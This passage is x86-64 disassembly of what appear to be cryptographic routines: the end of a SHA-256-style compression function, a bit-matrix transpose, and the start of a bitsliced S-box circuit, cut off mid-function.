    6d8c7af7:	41 f7 d0             	not    %r8d
    6d8c7afa:	41 89 c6             	mov    %eax,%r14d
    6d8c7afd:	41 21 d0             	and    %edx,%r8d
    6d8c7b00:	41 21 fe             	and    %edi,%r14d
    6d8c7b03:	45 31 c6             	xor    %r8d,%r14d
    6d8c7b06:	45 89 c8             	mov    %r9d,%r8d
    6d8c7b09:	45 01 ee             	add    %r13d,%r14d
    6d8c7b0c:	45 89 cd             	mov    %r9d,%r13d
    6d8c7b0f:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c7b13:	41 c1 cd 0d          	ror    $0xd,%r13d
    6d8c7b17:	44 01 f5             	add    %r14d,%ebp
    6d8c7b1a:	45 31 c5             	xor    %r8d,%r13d
    6d8c7b1d:	45 89 c8             	mov    %r9d,%r8d
    6d8c7b20:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c7b24:	45 31 c5             	xor    %r8d,%r13d
    6d8c7b27:	45 89 e0             	mov    %r12d,%r8d
    6d8c7b2a:	45 31 d0             	xor    %r10d,%r8d
    6d8c7b2d:	45 21 c8             	and    %r9d,%r8d
    6d8c7b30:	45 31 f8             	xor    %r15d,%r8d
    6d8c7b33:	45 89 d7             	mov    %r10d,%r15d
    6d8c7b36:	45 01 e8             	add    %r13d,%r8d
    6d8c7b39:	41 89 ed             	mov    %ebp,%r13d
    6d8c7b3c:	45 01 f0             	add    %r14d,%r8d
    6d8c7b3f:	41 89 ee             	mov    %ebp,%r14d
    6d8c7b42:	41 c1 cd 06          	ror    $0x6,%r13d
    6d8c7b46:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c7b4a:	45 31 f5             	xor    %r14d,%r13d
    6d8c7b4d:	41 89 ee             	mov    %ebp,%r14d
    6d8c7b50:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7b54:	45 31 ee             	xor    %r13d,%r14d
    6d8c7b57:	44 8b ac 24 fc 00 00 	mov    0xfc(%rsp),%r13d
    6d8c7b5e:	00 
    6d8c7b5f:	42 8d 94 2a f2 78 71 	lea    -0x398e870e(%rdx,%r13,1),%edx
    6d8c7b66:	c6 
    6d8c7b67:	41 89 fd             	mov    %edi,%r13d
    6d8c7b6a:	44 01 f2             	add    %r14d,%edx
    6d8c7b6d:	41 89 ee             	mov    %ebp,%r14d
    6d8c7b70:	41 21 ed             	and    %ebp,%r13d
    6d8c7b73:	41 f7 d6             	not    %r14d
    6d8c7b76:	41 21 c6             	and    %eax,%r14d
    6d8c7b79:	45 31 ee             	xor    %r13d,%r14d
    6d8c7b7c:	45 89 c5             	mov    %r8d,%r13d
    6d8c7b7f:	41 01 d6             	add    %edx,%r14d
    6d8c7b82:	44 89 c2             	mov    %r8d,%edx
    6d8c7b85:	41 c1 cd 02          	ror    $0x2,%r13d
    6d8c7b89:	c1 ca 0d             	ror    $0xd,%edx
    6d8c7b8c:	44 31 ea             	xor    %r13d,%edx
    6d8c7b8f:	45 89 c5             	mov    %r8d,%r13d
    6d8c7b92:	41 c1 c5 0a          	rol    $0xa,%r13d
    6d8c7b96:	44 31 ea             	xor    %r13d,%edx
    6d8c7b99:	45 89 d5             	mov    %r10d,%r13d
    6d8c7b9c:	45 21 cf             	and    %r9d,%r15d
    6d8c7b9f:	44 03 51 0c          	add    0xc(%rcx),%r10d
    6d8c7ba3:	45 31 cd             	xor    %r9d,%r13d
    6d8c7ba6:	03 69 14             	add    0x14(%rcx),%ebp
    6d8c7ba9:	45 01 e3             	add    %r12d,%r11d
    6d8c7bac:	45 21 c5             	and    %r8d,%r13d
    6d8c7baf:	44 03 49 08          	add    0x8(%rcx),%r9d
    6d8c7bb3:	44 01 c6             	add    %r8d,%esi
    6d8c7bb6:	45 31 fd             	xor    %r15d,%r13d
    6d8c7bb9:	03 79 18             	add    0x18(%rcx),%edi
    6d8c7bbc:	89 71 04             	mov    %esi,0x4(%rcx)
    6d8c7bbf:	03 41 1c             	add    0x1c(%rcx),%eax
    6d8c7bc2:	41 01 dd             	add    %ebx,%r13d
    6d8c7bc5:	44 89 51 0c          	mov    %r10d,0xc(%rcx)
    6d8c7bc9:	41 01 d5             	add    %edx,%r13d
    6d8c7bcc:	89 69 14             	mov    %ebp,0x14(%rcx)
    6d8c7bcf:	45 01 f5             	add    %r14d,%r13d
    6d8c7bd2:	45 01 de             	add    %r11d,%r14d
    6d8c7bd5:	44 89 49 08          	mov    %r9d,0x8(%rcx)
    6d8c7bd9:	44 89 29             	mov    %r13d,(%rcx)
    6d8c7bdc:	44 89 71 10          	mov    %r14d,0x10(%rcx)
    6d8c7be0:	89 79 18             	mov    %edi,0x18(%rcx)
    6d8c7be3:	89 41 1c             	mov    %eax,0x1c(%rcx)
    6d8c7be6:	48 81 c4 08 01 00 00 	add    $0x108,%rsp
    6d8c7bed:	5b                   	pop    %rbx
    6d8c7bee:	5e                   	pop    %rsi
    6d8c7bef:	5f                   	pop    %rdi
    6d8c7bf0:	5d                   	pop    %rbp
    6d8c7bf1:	41 5c                	pop    %r12
    6d8c7bf3:	41 5d                	pop    %r13
    6d8c7bf5:	41 5e                	pop    %r14
    6d8c7bf7:	41 5f                	pop    %r15
    6d8c7bf9:	c3                   	ret
    6d8c7bfa:	90                   	nop
    6d8c7bfb:	90                   	nop
    6d8c7bfc:	90                   	nop
    6d8c7bfd:	90                   	nop
    6d8c7bfe:	90                   	nop
    6d8c7bff:	90                   	nop
    6d8c7c00:	41 57                	push   %r15
    6d8c7c02:	41 56                	push   %r14
    6d8c7c04:	41 55                	push   %r13
    6d8c7c06:	41 54                	push   %r12
    6d8c7c08:	55                   	push   %rbp
    6d8c7c09:	57                   	push   %rdi
    6d8c7c0a:	56                   	push   %rsi
    6d8c7c0b:	53                   	push   %rbx
    6d8c7c0c:	49 bc aa aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaaa,%r12
    6d8c7c13:	aa aa aa 
    6d8c7c16:	49 bd 55 55 55 55 55 	movabs $0x5555555555555555,%r13
    6d8c7c1d:	55 55 55 
    6d8c7c20:	49 be 33 33 33 33 33 	movabs $0x3333333333333333,%r14
    6d8c7c27:	33 33 33 
    6d8c7c2a:	4c 8b 01             	mov    (%rcx),%r8
    6d8c7c2d:	48 8b 41 08          	mov    0x8(%rcx),%rax
    6d8c7c31:	4c 8b 49 18          	mov    0x18(%rcx),%r9
    6d8c7c35:	48 8b 59 38          	mov    0x38(%rcx),%rbx
    6d8c7c39:	4c 89 c2             	mov    %r8,%rdx
    6d8c7c3c:	4d 89 c3             	mov    %r8,%r11
    6d8c7c3f:	4c 8b 41 10          	mov    0x10(%rcx),%r8
    6d8c7c43:	48 8d 2c 00          	lea    (%rax,%rax,1),%rbp
    6d8c7c47:	49 d1 eb             	shr    $1,%r11
    6d8c7c4a:	4c 21 ea             	and    %r13,%rdx
    6d8c7c4d:	4c 21 e0             	and    %r12,%rax
    6d8c7c50:	4c 21 e5             	and    %r12,%rbp
    6d8c7c53:	4d 21 eb             	and    %r13,%r11
    6d8c7c56:	4c 8d 3c 1b          	lea    (%rbx,%rbx,1),%r15
    6d8c7c5a:	48 09 d5             	or     %rdx,%rbp
    6d8c7c5d:	49 09 c3             	or     %rax,%r11
    6d8c7c60:	4c 89 c2             	mov    %r8,%rdx
    6d8c7c63:	4c 89 c6             	mov    %r8,%rsi
    6d8c7c66:	4c 8b 41 28          	mov    0x28(%rcx),%r8
    6d8c7c6a:	4c 21 e3             	and    %r12,%rbx
    6d8c7c6d:	4b 8d 04 09          	lea    (%r9,%r9,1),%rax
    6d8c7c71:	4c 21 ea             	and    %r13,%rdx
    6d8c7c74:	48 d1 ee             	shr    $1,%rsi
    6d8c7c77:	4c 21 e0             	and    %r12,%rax
    6d8c7c7a:	4d 21 e1             	and    %r12,%r9
    6d8c7c7d:	4c 21 ee             	and    %r13,%rsi
    6d8c7c80:	48 09 d0             	or     %rdx,%rax
    6d8c7c83:	48 8b 51 20          	mov    0x20(%rcx),%rdx
    6d8c7c87:	4c 09 ce             	or     %r9,%rsi
    6d8c7c8a:	4d 21 e7             	and    %r12,%r15
    6d8c7c8d:	4b 8d 3c 00          	lea    (%r8,%r8,1),%rdi
    6d8c7c91:	4d 21 e0             	and    %r12,%r8
    6d8c7c94:	4c 21 e7             	and    %r12,%rdi
    6d8c7c97:	4c 8d 24 85 00 00 00 	lea    0x0(,%rax,4),%r12
    6d8c7c9e:	00 
    6d8c7c9f:	49 89 d1             	mov    %rdx,%r9
    6d8c7ca2:	48 d1 ea             	shr    $1,%rdx
    6d8c7ca5:	49 89 d2             	mov    %rdx,%r10
    6d8c7ca8:	48 8b 51 30          	mov    0x30(%rcx),%rdx
    6d8c7cac:	4d 21 e9             	and    %r13,%r9
    6d8c7caf:	4c 09 cf             	or     %r9,%rdi
    6d8c7cb2:	4d 21 ea             	and    %r13,%r10
    6d8c7cb5:	4d 09 c2             	or     %r8,%r10
    6d8c7cb8:	49 89 f8             	mov    %rdi,%r8
    6d8c7cbb:	49 89 d1             	mov    %rdx,%r9
    6d8c7cbe:	48 d1 ea             	shr    $1,%rdx
    6d8c7cc1:	4d 21 e9             	and    %r13,%r9
    6d8c7cc4:	49 21 d5             	and    %rdx,%r13
    6d8c7cc7:	48 89 ea             	mov    %rbp,%rdx
    6d8c7cca:	4c 09 eb             	or     %r13,%rbx
    6d8c7ccd:	4c 21 f2             	and    %r14,%rdx
    6d8c7cd0:	4d 09 cf             	or     %r9,%r15
    6d8c7cd3:	49 bd cc cc cc cc cc 	movabs $0xcccccccccccccccc,%r13
    6d8c7cda:	cc cc cc 
    6d8c7cdd:	4d 21 ec             	and    %r13,%r12
    6d8c7ce0:	49 09 d4             	or     %rdx,%r12
    6d8c7ce3:	48 89 ea             	mov    %rbp,%rdx
    6d8c7ce6:	48 8d 2c b5 00 00 00 	lea    0x0(,%rsi,4),%rbp
    6d8c7ced:	00 
    6d8c7cee:	48 c1 ea 02          	shr    $0x2,%rdx
    6d8c7cf2:	4c 21 f2             	and    %r14,%rdx
    6d8c7cf5:	4c 21 e8             	and    %r13,%rax
    6d8c7cf8:	4c 21 ed             	and    %r13,%rbp
    6d8c7cfb:	48 09 c2             	or     %rax,%rdx
    6d8c7cfe:	4c 89 d8             	mov    %r11,%rax
    6d8c7d01:	4c 21 ee             	and    %r13,%rsi
    6d8c7d04:	4c 21 f0             	and    %r14,%rax
    6d8c7d07:	4d 21 f0             	and    %r14,%r8
    6d8c7d0a:	48 c1 ef 02          	shr    $0x2,%rdi
    6d8c7d0e:	48 09 c5             	or     %rax,%rbp
    6d8c7d11:	4c 89 d8             	mov    %r11,%rax
    6d8c7d14:	49 89 f9             	mov    %rdi,%r9
    6d8c7d17:	48 8d 3c 9d 00 00 00 	lea    0x0(,%rbx,4),%rdi
    6d8c7d1e:	00 
    6d8c7d1f:	48 c1 e8 02          	shr    $0x2,%rax
    6d8c7d23:	4c 21 eb             	and    %r13,%rbx
    6d8c7d26:	4c 21 f0             	and    %r14,%rax
    6d8c7d29:	4c 21 ef             	and    %r13,%rdi
    6d8c7d2c:	4d 21 f1             	and    %r14,%r9
    6d8c7d2f:	49 bb f0 f0 f0 f0 f0 	movabs $0xf0f0f0f0f0f0f0f0,%r11
    6d8c7d36:	f0 f0 f0 
    6d8c7d39:	48 09 f0             	or     %rsi,%rax
    6d8c7d3c:	4a 8d 34 bd 00 00 00 	lea    0x0(,%r15,4),%rsi
    6d8c7d43:	00 
    6d8c7d44:	4d 21 ef             	and    %r13,%r15
    6d8c7d47:	4c 21 ee             	and    %r13,%rsi
    6d8c7d4a:	4d 89 e5             	mov    %r12,%r13
    6d8c7d4d:	49 c1 ec 04          	shr    $0x4,%r12
    6d8c7d51:	4c 09 c6             	or     %r8,%rsi
    6d8c7d54:	4d 89 d0             	mov    %r10,%r8
    6d8c7d57:	49 c1 ea 02          	shr    $0x2,%r10
    6d8c7d5b:	4d 21 f0             	and    %r14,%r8
    6d8c7d5e:	4d 21 d6             	and    %r10,%r14
    6d8c7d61:	4d 09 f9             	or     %r15,%r9
    6d8c7d64:	49 ba 0f 0f 0f 0f 0f 	movabs $0xf0f0f0f0f0f0f0f,%r10
    6d8c7d6b:	0f 0f 0f 
    6d8c7d6e:	4c 09 c7             	or     %r8,%rdi
    6d8c7d71:	49 89 d8             	mov    %rbx,%r8
    6d8c7d74:	48 89 f3             	mov    %rsi,%rbx
    6d8c7d77:	4d 21 d5             	and    %r10,%r13
    6d8c7d7a:	4d 21 d4             	and    %r10,%r12
    6d8c7d7d:	48 c1 e3 04          	shl    $0x4,%rbx
    6d8c7d81:	4c 21 de             	and    %r11,%rsi
    6d8c7d84:	4d 09 f0             	or     %r14,%r8
    6d8c7d87:	4c 21 db             	and    %r11,%rbx
    6d8c7d8a:	4c 09 e6             	or     %r12,%rsi
    6d8c7d8d:	4c 09 eb             	or     %r13,%rbx
    6d8c7d90:	48 89 71 20          	mov    %rsi,0x20(%rcx)
    6d8c7d94:	48 89 ee             	mov    %rbp,%rsi
    6d8c7d97:	48 89 19             	mov    %rbx,(%rcx)
    6d8c7d9a:	48 89 fb             	mov    %rdi,%rbx
    6d8c7d9d:	48 c1 e3 04          	shl    $0x4,%rbx
    6d8c7da1:	4c 21 d6             	and    %r10,%rsi
    6d8c7da4:	48 c1 ed 04          	shr    $0x4,%rbp
    6d8c7da8:	4c 21 db             	and    %r11,%rbx
    6d8c7dab:	4c 21 d5             	and    %r10,%rbp
    6d8c7dae:	4c 21 df             	and    %r11,%rdi
    6d8c7db1:	48 09 f3             	or     %rsi,%rbx
    6d8c7db4:	48 89 d6             	mov    %rdx,%rsi
    6d8c7db7:	48 c1 ea 04          	shr    $0x4,%rdx
    6d8c7dbb:	4c 21 d2             	and    %r10,%rdx
    6d8c7dbe:	48 89 59 08          	mov    %rbx,0x8(%rcx)
    6d8c7dc2:	4c 89 cb             	mov    %r9,%rbx
    6d8c7dc5:	4d 21 d9             	and    %r11,%r9
    6d8c7dc8:	49 09 d1             	or     %rdx,%r9
    6d8c7dcb:	4c 89 c2             	mov    %r8,%rdx
    6d8c7dce:	48 c1 e3 04          	shl    $0x4,%rbx
    6d8c7dd2:	4c 89 49 30          	mov    %r9,0x30(%rcx)
    6d8c7dd6:	48 c1 e2 04          	shl    $0x4,%rdx
    6d8c7dda:	49 89 c1             	mov    %rax,%r9
    6d8c7ddd:	48 c1 e8 04          	shr    $0x4,%rax
    6d8c7de1:	4c 21 db             	and    %r11,%rbx
    6d8c7de4:	4c 21 d6             	and    %r10,%rsi
    6d8c7de7:	4c 21 da             	and    %r11,%rdx
    6d8c7dea:	4d 21 d1             	and    %r10,%r9
    6d8c7ded:	4c 21 d0             	and    %r10,%rax
    6d8c7df0:	4d 21 d8             	and    %r11,%r8
    6d8c7df3:	48 09 fd             	or     %rdi,%rbp
    6d8c7df6:	48 09 f3             	or     %rsi,%rbx
    6d8c7df9:	4c 09 ca             	or     %r9,%rdx
    6d8c7dfc:	49 09 c0             	or     %rax,%r8
    6d8c7dff:	48 89 69 28          	mov    %rbp,0x28(%rcx)
    6d8c7e03:	48 89 59 10          	mov    %rbx,0x10(%rcx)
    6d8c7e07:	48 89 51 18          	mov    %rdx,0x18(%rcx)
    6d8c7e0b:	4c 89 41 38          	mov    %r8,0x38(%rcx)
    6d8c7e0f:	5b                   	pop    %rbx
    6d8c7e10:	5e                   	pop    %rsi
    6d8c7e11:	5f                   	pop    %rdi
    6d8c7e12:	5d                   	pop    %rbp
    6d8c7e13:	41 5c                	pop    %r12
    6d8c7e15:	41 5d                	pop    %r13
    6d8c7e17:	41 5e                	pop    %r14
    6d8c7e19:	41 5f                	pop    %r15
    6d8c7e1b:	c3                   	ret
    6d8c7e1c:	41 57                	push   %r15
    6d8c7e1e:	41 56                	push   %r14
    6d8c7e20:	41 55                	push   %r13
    6d8c7e22:	41 54                	push   %r12
    6d8c7e24:	55                   	push   %rbp
    6d8c7e25:	57                   	push   %rdi
    6d8c7e26:	56                   	push   %rsi
    6d8c7e27:	53                   	push   %rbx
    6d8c7e28:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
    6d8c7e2f:	48 8d 84 24 90 00 00 	lea    0x90(%rsp),%rax
    6d8c7e36:	00 
    6d8c7e37:	41 89 c8             	mov    %ecx,%r8d
    6d8c7e3a:	b9 0e 00 00 00       	mov    $0xe,%ecx
    6d8c7e3f:	48 8d 50 08          	lea    0x8(%rax),%rdx
    6d8c7e43:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
    6d8c7e48:	31 c0                	xor    %eax,%eax
    6d8c7e4a:	48 89 d7             	mov    %rdx,%rdi
    6d8c7e4d:	f3 ab                	rep stos %eax,(%rdi)
    6d8c7e4f:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    6d8c7e54:	44 89 c0             	mov    %r8d,%eax
    6d8c7e57:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
    6d8c7e5e:	00 
    6d8c7e5f:	e8 9c fd ff ff       	call   0x6d8c7c00
    6d8c7e64:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
    6d8c7e6b:	00 
    6d8c7e6c:	48 8b 9c 24 b0 00 00 	mov    0xb0(%rsp),%rbx
    6d8c7e73:	00 
    6d8c7e74:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
    6d8c7e7b:	00 
    6d8c7e7c:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
    6d8c7e83:	00 
    6d8c7e84:	48 89 d6             	mov    %rdx,%rsi
    6d8c7e87:	4c 8b 94 24 c0 00 00 	mov    0xc0(%rsp),%r10
    6d8c7e8e:	00 
    6d8c7e8f:	48 89 d7             	mov    %rdx,%rdi
    6d8c7e92:	48 31 de             	xor    %rbx,%rsi
    6d8c7e95:	4c 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%r15
    6d8c7e9c:	00 
    6d8c7e9d:	49 89 dc             	mov    %rbx,%r12
    6d8c7ea0:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
    6d8c7ea5:	4c 8b 8c 24 90 00 00 	mov    0x90(%rsp),%r9
    6d8c7eac:	00 
    6d8c7ead:	48 89 d6             	mov    %rdx,%rsi
    6d8c7eb0:	49 31 cc             	xor    %rcx,%r12
    6d8c7eb3:	48 31 ce             	xor    %rcx,%rsi
    6d8c7eb6:	48 31 c7             	xor    %rax,%rdi
    6d8c7eb9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
    6d8c7ebe:	4c 89 e6             	mov    %r12,%rsi
    6d8c7ec1:	48 89 fd             	mov    %rdi,%rbp
    6d8c7ec4:	4d 31 d7             	xor    %r10,%r15
    6d8c7ec7:	48 31 fe             	xor    %rdi,%rsi
    6d8c7eca:	4d 31 f9             	xor    %r15,%r9
    6d8c7ecd:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
    6d8c7ed2:	48 89 d6             	mov    %rdx,%rsi
    6d8c7ed5:	4c 8b 74 24 40       	mov    0x40(%rsp),%r14
    6d8c7eda:	4c 31 ce             	xor    %r9,%rsi
    6d8c7edd:	4c 33 b4 24 a8 00 00 	xor    0xa8(%rsp),%r14
    6d8c7ee4:	00 
    6d8c7ee5:	4c 31 cb             	xor    %r9,%rbx
    6d8c7ee8:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
    6d8c7eed:	48 89 c6             	mov    %rax,%rsi
    6d8c7ef0:	48 f7 d0             	not    %rax
    6d8c7ef3:	4c 31 ce             	xor    %r9,%rsi
    6d8c7ef6:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
    6d8c7efb:	4c 89 fb             	mov    %r15,%rbx
    6d8c7efe:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
    6d8c7f03:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
    6d8c7f08:	48 33 74 24 60       	xor    0x60(%rsp),%rsi
    6d8c7f0d:	4c 31 f1             	xor    %r14,%rcx
    6d8c7f10:	4d 31 d6             	xor    %r10,%r14
    6d8c7f13:	48 31 cb             	xor    %rcx,%rbx
    6d8c7f16:	4d 89 f0             	mov    %r14,%r8
    6d8c7f19:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
    6d8c7f1e:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
    6d8c7f25:	00 
    6d8c7f26:	49 f7 d0             	not    %r8
    6d8c7f29:	4c 23 44 24 38       	and    0x38(%rsp),%r8
    6d8c7f2e:	48 89 74 24 68       	mov    %rsi,0x68(%rsp)
    6d8c7f33:	48 8b b4 24 90 00 00 	mov    0x90(%rsp),%rsi
    6d8c7f3a:	00 
    6d8c7f3b:	48 31 ce             	xor    %rcx,%rsi
    6d8c7f3e:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
    6d8c7f43:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
    6d8c7f48:	4c 31 f6             	xor    %r14,%rsi
    6d8c7f4b:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
    6d8c7f50:	48 31 f3             	xor    %rsi,%rbx
    6d8c7f53:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
    6d8c7f58:	48 33 74 24 30       	xor    0x30(%rsp),%rsi
    6d8c7f5d:	48 89 5c 24 78       	mov    %rbx,0x78(%rsp)
    6d8c7f62:	4c 33 7c 24 30       	xor    0x30(%rsp),%r15
    6d8c7f67:	48 89 b4 24 80 00 00 	mov    %rsi,0x80(%rsp)
    6d8c7f6e:	00 
    6d8c7f6f:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
    6d8c7f76:	00 
    6d8c7f77:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
    6d8c7f7c:	4c 21 fd             	and    %r15,%rbp
    6d8c7f7f:	4c 8b 5c 24 20       	mov    0x20(%rsp),%r11
    6d8c7f84:	4c 23 5c 24 28       	and    0x28(%rsp),%r11
    6d8c7f89:	4d 21 e2             	and    %r12,%r10
    6d8c7f8c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
    6d8c7f91:	4d 31 c2             	xor    %r8,%r10
    6d8c7f94:	48 21 ce             	and    %rcx,%rsi
    6d8c7f97:	4d 89 d5             	mov    %r10,%r13
    6d8c7f9a:	4c 8b 54 24 68       	mov    0x68(%rsp),%r10
    6d8c7f9f:	49 31 f6             	xor    %rsi,%r14
    6d8c7fa2:	4c 23 54 24 70       	and    0x70(%rsp),%r10
    6d8c7fa7:	4d 31 c3             	xor    %r8,%r11
    6d8c7faa:	4c 8b 44 24 58       	mov    0x58(%rsp),%r8
    6d8c7faf:	4d 31 f2             	xor    %r14,%r10
    6d8c7fb2:	4c 8b b4 24 90 00 00 	mov    0x90(%rsp),%r14
    6d8c7fb9:	00 
    6d8c7fba:	4d 31 ea             	xor    %r13,%r10
    6d8c7fbd:	4c 23 44 24 78       	and    0x78(%rsp),%r8
    6d8c7fc2:	4c 21 c8             	and    %r9,%rax
    6d8c7fc5:	4c 31 fa             	xor    %r15,%rdx
    6d8c7fc8:	48 23 9c 24 90 00 00 	and    0x90(%rsp),%rbx
    6d8c7fcf:	00 
    6d8c7fd0:	48 31 f8             	xor    %rdi,%rax
    6d8c7fd3:	48 33 5c 24 20       	xor    0x20(%rsp),%rbx
    6d8c7fd8:	4c 31 f8             	xor    %r15,%rax
    6d8c7fdb:	48 33 5c 24 28       	xor    0x28(%rsp),%rbx
    6d8c7fe0:	48 31 e8             	xor    %rbp,%rax
    6d8c7fe3:	48 31 d5             	xor    %rdx,%rbp
    6d8c7fe6:	4c 31 c5             	xor    %r8,%rbp
    6d8c7fe9:	4c 31 e8             	xor    %r13,%rax
    6d8c7fec:	49 89 e8             	mov    %rbp,%r8
    6d8c7fef:	4c 89 d5             	mov    %r10,%rbp
    6d8c7ff2:	49 21 c2             	and    %rax,%r10
    6d8c7ff5:	4d 31 d8             	xor    %r11,%r8
    6d8c7ff8:	48 89 c2             	mov    %rax,%rdx
    6d8c7ffb:	48 31 f3             	xor    %rsi,%rbx
    6d8c7ffe:	4c 89 c6             	mov    %r8,%rsi
    6d8c8001:	4c 31 c2             	xor    %r8,%rdx
    6d8c8004:	4c 31 db             	xor    %r11,%rbx
    6d8c8007:	4c 31 d6             	xor    %r10,%rsi
    6d8c800a:	48 31 dd             	xor    %rbx,%rbp
    6d8c800d:	49 89 eb             	mov    %rbp,%r11
    6d8c8010:	49 21 f3             	and    %rsi,%r11
    6d8c8013:	49 31 db             	xor    %rbx,%r11
    6d8c8016:	4c 31 d3             	xor    %r10,%rbx
    6d8c8019:	48 21 da             	and    %rbx,%rdx
    6d8c801c:	4c 89 c3             	mov    %r8,%rbx
    6d8c801f:	49 31 d2             	xor    %rdx,%r10
    6d8c8022:	48 31 d3             	xor    %rdx,%rbx
    6d8c8025:	4c 89 da             	mov    %r11,%rdx
    6d8c8028:	4d 21 d0             	and    %r10,%r8
    6d8c802b:	48 31 d8             	xor    %rbx,%rax
    6d8c802e:	49 89 dd             	mov    %rbx,%r13
    6d8c8031:	4c 31 c6             	xor    %r8,%rsi
    6d8c8034:	4c 31 c0             	xor    %r8,%rax
    6d8c8037:	4d 89 d8             	mov    %r11,%r8
    6d8c803a:	49 89 f2             	mov    %rsi,%r10
    6d8c803d:	4d 21 da             	and    %r11,%r10
    6d8c8040:	49 31 ea             	xor    %rbp,%r10
    6d8c8043:	48 89 c5             	mov    %rax,%rbp
    6d8c8046:	4c 31 d5             	xor    %r10,%rbp
    6d8c8049:	49 21 de             	and    %rbx,%r14
    6d8c804c:	4c 31 d2             	xor    %r10,%rdx
    6d8c804f:	4c 89 b4 24 88 00 00 	mov    %r14,0x88(%rsp)
    6d8c8056:	00 
    6d8c8057:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
    6d8c805c:	49 21 d7             	and    %rdx,%r15
    6d8c805f:	48 21 d7             	and    %rdx,%rdi
    6d8c8062:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    6d8c8067:	49 31 d8             	xor    %rbx,%r8
    6d8c806a:	48 89 ee             	mov    %rbp,%rsi
    6d8c806d:	49 31 c5             	xor    %rax,%r13
    6d8c8070:	4c 31 c6             	xor    %r8,%rsi
    6d8c8073:	4c 21 e9             	and    %r13,%rcx
    6d8c8076:	4c 23 6c 24 40       	and    0x40(%rsp),%r13
    6d8c807b:	4d 21 d1             	and    %r10,%r9
    6d8c807e:	4c 31 f9             	xor    %r15,%rcx
    6d8c8081:	4c 23 54 24 60       	and    0x60(%rsp),%r10
    6d8c8086:	4d 21 de             	and    %r11,%r14
    6d8c8089:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
    6d8c808e:	4c 8b b4 24 80 00 00 	mov    0x80(%rsp),%r14
    6d8c8095:	00 
    6d8c8096:	4c 21 c2             	and    %r8,%rdx
    6d8c8099:	4c 23 44 24 30       	and    0x30(%rsp),%r8
    6d8c809e:	4c 33 54 24 78       	xor    0x78(%rsp),%r10
    6d8c80a3:	49 21 f6             	and    %rsi,%r14
    6d8c80a6:	4c 21 e6             	and    %r12,%rsi
    6d8c80a9:	4d 89 cc             	mov    %r9,%r12
    6d8c80ac:	4c 89 b4 24 80 00 00 	mov    %r14,0x80(%rsp)
    6d8c80b3:	00 
    6d8c80b4:	4c 8b 74 24 68       	mov    0x68(%rsp),%r14
    6d8c80b9:	4d 31 f8             	xor    %r15,%r8
    6d8c80bc:	48 31 f2             	xor    %rsi,%rdx
    6d8c80bf:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
    6d8c80c4:	49 31 d4             	xor    %rdx,%r12
    6d8c80c7:	4c 33 84 24 80 00 00 	xor    0x80(%rsp),%r8
    6d8c80ce:	00 
    6d8c80cf:	49 21 c6             	and    %rax,%r14
    6d8c80d2:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
    6d8c80d7:	49 89 fe             	mov    %rdi,%r14
    6d8c80da:	4c 33 6c 24 68       	xor    0x68(%rsp),%r13
    6d8c80df:	49 21 ef             	and    %rbp,%r15
    6d8c80e2:	48 8b bc 24 88 00 00 	mov    0x88(%rsp),%rdi
    6d8c80e9:	00 
    6d8c80ea:	4d 31 c1             	xor    %r8,%r9
    6d8c80ed:	4c 33 bc 24 80 00 00 	xor    0x80(%rsp),%r15
    6d8c80f4:	00 
    6d8c80f5:	4d 31 e5             	xor    %r12,%r13
    6d8c80f8:	4c 31 f7             	xor    %r14,%rdi
    6d8c80fb:	48 31 cf             	xor    %rcx,%rdi
    6d8c80fe:	4d 31 e7             	xor    %r12,%r15
    6d8c8101:	4c 23 5c 24 58       	and    0x58(%rsp),%r11
    6d8c8106:	4d 31 d6             	xor    %r10,%r14
    6d8c8109:	48 23 44 24 70       	and    0x70(%rsp),%rax
    6d8c810e:	48 31 fa             	xor    %rdi,%rdx
    6d8c8111:	49 31 d2             	xor    %rdx,%r10
    6d8c8114:	49 f7 d2             	not    %r10
    6d8c8117:	49 31 fb             	xor    %rdi,%r11
    6d8c811a:	4c 31 e8             	xor    %r13,%rax
    6d8c811d:	4d 31 c5             	xor    %r8,%r13
    6d8c8120:	4d 89 c8             	mov    %r9,%r8
    6d8c8123:	48 31 c1             	xor    %rax,%rcx
    6d8c8126:	4c 89 ac 24 c8 00 00 	mov    %r13,0xc8(%rsp)
    6d8c812d:	00 
    6d8c812e:	4d 31 fb             	xor    %r15,%r11
    6d8c8131:	4d 31 f7             	xor    %r14,%r15
    6d8c8134:	49 31 c8             	xor    %rcx,%r8
    6d8c8137:	49 f7 d7             	not    %r15
    6d8c813a:	49 f7 d0             	not    %r8
    6d8c813d:	4c 89 84 24 c0 00 00 	mov    %r8,0xc0(%rsp)
    6d8c8144:	00 
    6d8c8145:	48 23 6c 24 20       	and    0x20(%rsp),%rbp
